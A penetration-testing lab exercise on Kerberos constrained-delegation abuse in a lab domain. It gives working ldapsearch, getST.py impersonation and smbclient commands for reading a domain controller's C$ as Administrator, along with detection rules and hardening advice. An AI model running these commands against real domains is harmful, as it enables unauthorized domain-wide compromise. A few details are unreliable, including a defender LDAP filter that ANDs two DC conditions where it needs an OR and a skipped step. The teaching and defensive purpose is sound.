    Exercise 4.4: Constrained Delegation Abuse

    Before You Begin

    Constrained delegation is a Kerberos feature that lets an account impersonate any user when authenticating to a specifically allowed list of services. The original use case was a web app that authenticates to a database on behalf of the connected user without the user re-authenticating. The abuse case: if you compromise an account that is configured for constrained delegation to a powerful service (CIFS on a DC, HTTP on AD CS, MSSQL on a sensitive database), you can use S4U2self followed by S4U2proxy to impersonate any user (including Domain Admins) when authenticating to that service.

    Exercise 4.4 gives you the credential of svc_deleg_<token>, an account with msDS-AllowedToDelegateTo containing cifs/corp-dc01. Impersonate Administrator, mount the DC's C$ as Administrator, and read your per-token flag file.

    Tools required: impacket-getST (often getST.py), smbclient, klist, ldapsearch. Pre-installed on Kali.

    Scenario

    Marcus Bell: "Constrained delegation says 'this account may impersonate any user, but only to these specific services.' If one of those services is the DC's CIFS share, you have a path to anything that account is allowed to delegate."

    Per-student: svc_deleg_<token> has a seeded credential (visible in the lab dashboard or recoverable from earlier exercises). Use it to impersonate Administrator and read C:\flag_<token>.txt.

    Credentials:

    Username Password Source
    svc_deleg_<token> (per-token, see lab dashboard) Provided / earlier exercise

    Domain: corp.nordport.local

    Your Objectives

    • Identify accounts with msDS-AllowedToDelegateTo set
    • Confirm svc_deleg_<token> delegates to cifs/corp-dc01
    • Use getST.py -impersonate Administrator to obtain a TGS for cifs/corp-dc01 as Administrator
    • Use the ticket to read \\corp-dc01\C$\flag_<token>.txt

    S4U2self + S4U2proxy In One Picture

    The two extension messages are the entire attack. The diagram below shows what each does and why the combination yields impersonation.

    sequenceDiagram
    autonumber
    participant A as Attacker (svc_deleg)
    participant K as KDC
    participant T as Target (cifs/corp-dc01)

    A->>K: AS-REQ for svc_deleg
    K-->>A: TGT_svc_deleg

    Note over A,K: S4U2self -- "give me a TGS to MYSELF as Administrator"
    A->>K: TGS-REQ (sname=svc_deleg, S4U2self for Administrator)<br/>TGT_svc_deleg in padata
    K-->>A: TGS_admin_to_svc_deleg<br/>(forwardable, signs PAC for Administrator)

    Note over A,K: S4U2proxy -- "use that TGS to get a ticket to cifs/corp-dc01"
    A->>K: TGS-REQ (sname=cifs/corp-dc01)<br/>TGS_admin_to_svc_deleg in padata
    K-->>A: TGS_admin_to_cifs<br/>(only because cifs/corp-dc01 is in msDS-AllowedToDelegateTo)

    A->>T: AP-REQ via SMB with TGS_admin_to_cifs
    T-->>A: SMB session as Administrator

    Three Delegation Types Compared

    The four delegation flavors look similar at the protocol level but have very different attack footprints. The table below tells you what to look for in userAccountControl and which message to abuse.

    Type UAC bit / attribute What you need What you abuse
    Unconstrained TRUSTED_FOR_DELEGATION (524288) A user authenticates to the host Captured forwardable TGT
    Constrained (no PT) msDS-AllowedToDelegateTo populated A target user TGT (forwardable) S4U2proxy only
    Constrained (with PT) msDS-AllowedToDelegateTo + T2A4D (16777216) Just the source credential S4U2self -> S4U2proxy (this exercise)
    RBCD msDS-AllowedToActOnBehalfOfOtherIdentity on target Compromised computer object Self-trust (covered in 4.5)

    Background: Three Kinds of Delegation

    Kerberos in AD supports three delegation models. Knowing which is which is half of the attack:

    Type AD attribute set What it allows Detection signal
    Unconstrained userAccountControl: TRUSTED_FOR_DELEGATION (524288) Account receives a forwardable TGT for any user who authenticates to it; can act as any of them anywhere Any account with this UAC bit; high signal
    Constrained (no protocol transition) msDS-AllowedToDelegateTo populated, no T2A4D Account uses S4U2proxy with an existing user TGT; cannot self-initiate Hard to abuse without an existing forwarded TGT
    Constrained (with protocol transition) msDS-AllowedToDelegateTo populated, userAccountControl: TRUSTED_TO_AUTH_FOR_DELEGATION (16777216) Account uses S4U2self to obtain a TGS for any user without their TGT, then S4U2proxy to the allowed service The classic abuse target
    Resource-Based (RBCD) msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer Reverses the trust direction: target says "I trust source to delegate" Covered in exercise 4.5

    The "with protocol transition" variant is what this exercise targets. The flag combination msDS-AllowedToDelegateTo + T2A4D lets the holder unilaterally impersonate any user to the allowed services; no user TGT required.

    The S4U2self / S4U2proxy flow

    svc_deleg          KDC                                       Target service (cifs/corp-dc01)
   |                |                                                       |
   |  1. Authenticate normally, get a TGT                                   |
   |--------------->|                                                       |
   |<---------------|                                                       |
   |                |                                                       |
   |  2. S4U2self: "I want a service ticket to MYSELF as Administrator"     |
   |     (uses T2A4D to bypass the requirement that Administrator presents  |
   |      a TGT)                                                            |
   |--------------->|                                                       |
   |<---------------|  TGS for svc_deleg-as-Administrator                   |
   |                |                                                       |
   |  3. S4U2proxy: "Using this TGS as Administrator, give me a TGS to      |
   |     cifs/corp-dc01"                                                    |
   |--------------->|                                                       |
   |<---------------|  TGS for cifs/corp-dc01-as-Administrator              |
   |                                                                        |
   |  4. Connect with the TGS                                               |
   |---------------------------------------------------------->             |

    The KDC validates that the target service (cifs/corp-dc01) is in svc_deleg's msDS-AllowedToDelegateTo list. If yes, it issues. The target service receives a normal TGS for Administrator and serves the request as Administrator. From the service's perspective the call is from Administrator; there is no protocol-level signal that delegation occurred.

    Why CIFS on a DC is the worst-case target

    Reading \\corp-dc01\C$ as Administrator gives you the entire NT directory of the DC. From there: - Pull ntds.dit (offline, copy + ESEDB extract) - Read the registry hives for SYSTEM, SAM, SECURITY (LSA secrets, machine account, cached credentials) - Pull the SAM hashes, krbtgt hash via secretsdump on the dumped files - Effectively own the domain

    So msDS-AllowedToDelegateTo containing any DC service (especially cifs, host, ldap, rpcss) is a Tier-0 escalation path. Defenders should never delegate any service to any DC unless absolutely required.

    Tool Primer

    LDAP enumeration of constrained delegation

    ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo userAccountControl

    Filter for accounts with T2A4D too:

    (&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))

    16777216 is 0x1000000, the T2A4D bit.

    getST.py for S4U2self + S4U2proxy

    getST.py corp.nordport.local/svc_deleg_<token>:'<password>' \
  -spn 'cifs/corp-dc01.corp.nordport.local' \
  -impersonate Administrator \
  -dc-ip <dc_ip>
    Flag Effect
    realm/user:password source authentication
    -spn target service principal name
    -impersonate <user> the user to impersonate (S4U2self target)
    -dc-ip DC for the AS exchange

    The output is a .ccache file named after the impersonated user.

    Using the resulting ticket

    export KRB5CCNAME=Administrator.ccache
smbclient //corp-dc01.corp.nordport.local/C$ -k -c "ls"

    -k tells smbclient to use the cached Kerberos ticket; the ccache contains the TGS for Administrator-to-cifs/corp-dc01.

    Walkthrough

    Step 1: Find Constrained-Delegation-with-T2A4D Accounts

    The discovery query combines two filters: accounts that have ANY entry in msDS-AllowedToDelegateTo (i.e., are configured for some constrained delegation) AND accounts with the T2A4D bit set in userAccountControl. Either alone yields a noisier result; the AND zeros in on the directly abusable accounts.

    Kali - Enumerate

    ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))" \
  sAMAccountName msDS-AllowedToDelegateTo
    Token Effect
    (msDS-AllowedToDelegateTo=*) Has any value (account configured for constrained delegation).
    userAccountControl:1.2.840.113556.1.4.803:=16777216 Bitwise AND against UAC for T2A4D (0x1000000).
    sAMAccountName msDS-AllowedToDelegateTo Return only these two attributes.

    Confirm svc_deleg_<token> shows up with cifs/corp-dc01... in its allowed-to list. Other students' accounts also appear; that is expected.

    For the lab, the seeded password is in the lab dashboard or visible in the per-token flag JSON the orchestrator wrote. In a real engagement you would have recovered it via Kerberoast (Exercise 3.3), a leaked SYSVOL script (Exercise 2.2), or any other credential-recovery path.

Pwd:  (per-token, see dashboard)

    Step 3: Run S4U2self + S4U2proxy

    getST.py performs both S4U exchanges in one call. Step 1 (S4U2self) requests a TGS from the KDC where svc_deleg impersonates Administrator to itself; T2A4D allows the request without Administrator presenting a TGT. Step 2 (S4U2proxy) uses that TGS as proof to request a TGS for the configured target service. The KDC validates the SPN against msDS-AllowedToDelegateTo and issues if it matches.

    Kali - Get Administrator's TGS via getST.py

    cd ~/work && mkdir -p adpt-4-04 && cd adpt-4-04
getST.py "corp.nordport.local/svc_deleg_${OCR_SCOPE_TOKEN}:<password>" \
  -spn 'cifs/corp-dc01.corp.nordport.local' \
  -impersonate Administrator \
  -dc-ip <dc_ip>
    Flag Effect
    <realm>/<user>:<pw> Source authentication string.
    -spn '<svc>/<host>.<realm>' Target SPN; must match an entry in source's msDS-AllowedToDelegateTo.
    -impersonate <user> The user whose identity will appear on the resulting ticket.
    -dc-ip <ip> KDC IP (skip DNS).

    A file named Administrator.ccache is written to the current directory. The script prints the impersonated principal and the TGS lifetime. If you see KDC_ERR_BADOPTION it usually means the SPN does not match the allowed-to list verbatim; check trailing instance/port and case.

    Step 4: Use the Ticket

    The ccache contains a TGS for cifs/corp-dc01 issued in Administrator's name. Setting KRB5CCNAME points GSS-API libraries at that file. smbclient -k uses cached Kerberos credentials instead of NTLM/password auth. The DC's CIFS service receives an AP-REQ wrapping a normal-looking TGS for Administrator and serves the request as Administrator.

    Kali - Mount C$ as Administrator

    export KRB5CCNAME=Administrator.ccache
klist
smbclient //corp-dc01.corp.nordport.local/C$ -k -c "ls flag_${OCR_SCOPE_TOKEN}.txt; get flag_${OCR_SCOPE_TOKEN}.txt"
cat flag_${OCR_SCOPE_TOKEN}.txt
    Token Effect
    KRB5CCNAME=<file> Tell GSS-API to use this credential cache.
    klist Display the principal and SPNs in the cache; verifies the right ticket is loaded.
    -k Authenticate using cached Kerberos credentials.
    corp-dc01.corp.nordport.local FQDN required; the SPN's host portion must match the connected hostname exactly.

    The flag file is owned by Administrator; you read it because the SMB session authenticates as Administrator courtesy of the forged TGS.

    Common gotchas

    • Hostname vs FQDN mismatch: SMB Kerberos uses the SPN derived from the connect string. //corp-dc01/C$ produces SPN cifs/corp-dc01; //corp-dc01.corp.nordport.local/C$ produces cifs/corp-dc01.corp.nordport.local. The -spn you used in Step 3 must match the SMB connect string format.
    • KDC_ERR_BADOPTION on S4U2proxy: usually means the requested SPN is not in the source's msDS-AllowedToDelegateTo. Re-check spelling, port suffix, and trailing whitespace.
    • Clock skew: Kerberos rejects timestamps more than 5 minutes off. Sync Kali to the DC: sudo ntpdate <dc_ip> or sudo chronyc -a 'burst 4/4'.
    • Cache pollution: previous Kerberos sessions may have cached a TGS for the same SPN under a different principal. kdestroy clears the cache before setting KRB5CCNAME to the new ccache.
    • NOT_DELEGATED on the impersonated user: if Administrator has the Account is sensitive and cannot be delegated flag (UAC bit 0x100000), S4U2self fails. Pick a different impersonation target.

    Blue Team Perspective

    The KDC events around S4U2self and S4U2proxy are distinct enough that a SOC with the right rule catches the attack within seconds.

    Activity Event ID Field giveaway
    S4U2self request 4769 Service Name = svc_deleg, requester = self
    S4U2proxy issued 4769 Service Name = cifs/dc01, ticket-options include cname-in-pa-data
    Auth as impersonated user 4624 logon type 3 Target host event log
    MDI delegation alert "Suspected identity theft (pass-the-ticket)" Defender for Identity

    The KDC giveaway

    Two consecutive 4769 events from the same source within milliseconds, where the first has Service Name matching the source's own SAM and the second has a different SPN, is the canonical S4U signature. Defender for Identity ships a built-in detection. Custom SIEM rule: alert when 4769 ServiceName matches sourceSamAccountName followed within 5 seconds by 4769 to a different SPN from the same source.

    Hardening Note

    The vulnerability lives in two attributes on the source account. Audit both, restrict who can set either, and never delegate to a DC service.

    Constrained delegation hardening

    • LDAP audit weekly: (&(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216)). Treat any DC-targeted entry as critical.
    • Empty Account Operators group; the SeEnableDelegationPrivilege granted to its members is dangerous.
    • Move delegating service accounts to gMSAs so the source credential is uncrackable.
    • Mark privileged accounts (Tier 0) as Account is sensitive and cannot be delegated (NOT_DELEGATED UAC bit 0x100000).
    • Build SIEM rule on consecutive 4769 events as described above.
    • Replace constrained delegation with RBCD for any new service deployment; RBCD is configured on the target rather than the source, which is easier to audit.

    Analysis Questions

    1. The exercise depends on T2A4D being set in addition to msDS-AllowedToDelegateTo. What changes for the attacker if T2A4D is NOT set?

    Reveal Answer

    Without T2A4D, the account is configured for constrained delegation without protocol transition. S4U2self is unavailable (the bit explicitly enables it). To exercise constrained delegation in this mode, the attacker needs an actual forwardable TGT from the user they want to impersonate. That requires either: (a) capturing a forwardable TGT from somewhere, (b) waiting for the user to authenticate to a service the attacker controls, (c) coercing the user to authenticate (PetitPotam, PrinterBug). In practice, "constrained delegation without T2A4D" is much less useful as a foothold; the attack chain has to first acquire a target user's TGT through a separate mechanism. With T2A4D, no preliminaries are required: source credential alone yields impersonation.

    2. The KDC enforces the msDS-AllowedToDelegateTo list when issuing the S4U2proxy TGS. What stops an attacker from editing their own account's msDS-AllowedToDelegateTo?

    Reveal Answer

    Editing msDS-AllowedToDelegateTo requires the SeEnableDelegationPrivilege user right, which is granted only to Domain Admins and Account Operators by default. A regular domain user cannot add SPNs to the list. However, Account Operators is a built-in group whose membership is sometimes wider than people realize, and GenericWrite on a target account does NOT grant the right to add to msDS-AllowedToDelegateTo (the schema-level enforcement uses SeEnableDelegationPrivilege, not the standard ACL). If an attacker has Domain Admin or Account Operators they have already won; the constraint exists primarily to limit how an attacker with mid-tier rights can elevate. The realistic abuse scenario is: find an account that is already configured for delegation by a sloppy admin, then leverage it; do not try to configure delegation as a non-Tier-0 attacker.

    3. From a defender's perspective, what query enumerates the highest-risk constrained delegation paths?

    Reveal Answer

    The query is "any account with msDS-AllowedToDelegateTo containing a service on a Domain Controller, especially cifs/, host/, ldap/, rpcss/, or time/." LDAP filter:

    (&(msDS-AllowedToDelegateTo=cifs/corp-dc01*)
  (msDS-AllowedToDelegateTo=cifs/corp-dc02*))

    Or any wildcard match against DC hostnames. Each result is a Tier-0 escalation path. The mitigation is to remove the entry; if the delegation is needed (rare for DCs), restrict T2A4D to break the protocol-transition convenience and force the attacker to capture an actual forwardable TGT. For a comprehensive view, BloodHound's AllowedToDelegate edges show the same data graphically.

    Key Takeaways

    • Constrained delegation + T2A4D = unilateral impersonation of any user to the allowed service.
    • getST.py -impersonate <user> -spn <target> performs S4U2self then S4U2proxy.
    • A delegation entry pointing at any DC service is a Tier-0 escalation path.
    • The KDC enforces the SPN list; only Domain Admins / Account Operators can edit it.
    • BloodHound AllowedToDelegate edges show the graph of every delegation in the domain.

    Spaced Repetition

    Card 1: getST.py Invocation

    Q: Write the getST.py command to obtain a TGS impersonating Administrator for cifs/dc01.corp.local using source svc_app:Pass# against corp.local.

    Answer 
    getST.py "corp.local/svc_app:Pass#" \
  -spn 'cifs/dc01.corp.local' \
  -impersonate Administrator \
  -dc-ip 10.10.10.10

    Output: Administrator.ccache. Use with KRB5CCNAME=Administrator.ccache and any -k Kerberos-aware tool.

    Card 2: T2A4D Flag Bit

    Q: What is the userAccountControl bit value for TRUSTED_TO_AUTH_FOR_DELEGATION, and why does it matter?

    Answer

    0x1000000 = decimal 16777216. Setting it on an account enables S4U2self, which lets the account obtain a service ticket for any user without that user presenting a TGT. Combined with msDS-AllowedToDelegateTo, it allows unilateral impersonation. Find such accounts via (userAccountControl:1.2.840.113556.1.4.803:=16777216). T2A4D = "Trust this user for delegation to specified services only, and use any authentication protocol" (the protocol transition piece).

    Card 3: Three Delegation Types

    Q: Distinguish unconstrained, constrained-without-protocol-transition, and constrained-with-protocol-transition delegation.

    Answer

    Unconstrained: TRUSTED_FOR_DELEGATION UAC bit; account receives forwardable TGTs for any user authenticating to it; can act anywhere as any of them. Constrained without PT: msDS-AllowedToDelegateTo populated; no T2A4D; needs an existing forwardable TGT to use S4U2proxy. Constrained with PT: msDS-AllowedToDelegateTo + T2A4D; uses S4U2self to bootstrap, then S4U2proxy; unilateral. The third is the classic abuse target.

    Card 4: Why DC CIFS Is Worst-Case

    Q: Why is delegation to cifs/dc01 essentially Domain Admin?

    Answer

    Reading \\dc01\C$ as Administrator gives access to the entire NTFS volume on the DC, including the registry hives (SYSTEM, SAM, SECURITY), ntds.dit (the AD database), and any LSA secrets. From there secretsdump extracts the krbtgt hash, all user hashes, and machine secrets; effectively the entire domain is compromised. Any delegation entry pointing at any DC service should be removed unless the operational need is overwhelming and the source account is itself Tier-0.

    Card 5: SeEnableDelegationPrivilege

    Q: Which privilege is required to write msDS-AllowedToDelegateTo, and why does GenericWrite alone not suffice?

    Answer

    SeEnableDelegationPrivilege, granted only to Domain Admins and (by default) Account Operators. The schema-level enforcement uses this privilege rather than the standard ACL: even an account with GenericWrite on a target user cannot add to msDS-AllowedToDelegateTo without also having SeEnableDelegationPrivilege on the DC. The privilege gate is intentional protection against delegation abuse via mid-tier privilege escalations. Defenders should ensure Account Operators membership is empty (most environments do not need it).
